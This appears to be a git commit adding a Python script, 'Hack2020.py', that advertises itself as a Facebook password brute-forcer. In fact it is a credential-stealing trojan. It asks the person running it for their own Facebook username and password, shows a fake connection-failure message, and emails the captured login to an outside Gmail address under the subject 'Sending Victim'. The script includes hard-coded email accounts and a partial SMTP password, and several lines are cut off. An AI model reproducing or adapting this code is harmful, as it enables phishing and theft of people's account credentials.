e58bc7f264b225425b0865908e2229e8effcf992
CyberHack2020 <60795170+CyberHack2020@users.noreply.github.com>
2020-02-08 03:03:51 +0700

    Add files via upload

---
+++ Hack2020.py
@@ -0,0 +1,42 @@
+# -*- coding: utf-8 -*-
+# coding=utf-8
+import socket,struct,os,sys,time,yagmail
+x=yagmail.SMTP('cucimotormaslung@gmail.com','cimu>
+subject='Sending Victim'
+logo = """\x1b[34m
+
+ ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀  █████▒▄▄▄▄
+▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██   ▒▓█████▄
+▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒████ ░▒██▒ ▄██
+░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▒  ░▒██░█▀
+░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒█░   ░▓█  ▀█▓
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒ ░   ░▒▓███▀▒
+ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░     ▒░▒   ░
+ ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ░ ░    ░    ░
+ ░  ░  ░      ░  ░░ ░      ░  ░           ░
+                  ░                            ░\>
+
+banner = """
+\x1b[34mHack Friendlist Facebook
+\x1b[00mAutomatic cracking password with Brutefor>
+\x1b[00mPlease login with your account \x1b[91m!
+"""
+def main():
+        os.system('clear')
+        print(logo)
+        print(banner)
+        print('\x1b[00m\033[41m FACEBOOK LOGIN \0>
+        u=input('\x1b[00mUsername: \x1b[33m')
+        p=input('\x1b[00mPassword: \x1b[33m')
+        msg=('username: '+u+', password: '+p)
+        body=(msg)
+        print('')
+        print('\x1b[00mSorry, connection failed\x>
+        print('\x1b[33mPlease try again later ...>
+        os.system('sleep 3')
+        print('')
+        print('\x1b[00mExiting program \x1b[91m!')
+        os.system('exit')
+        x.send('masi.iruli@gmail.com',subject,bod>
+
+main ()
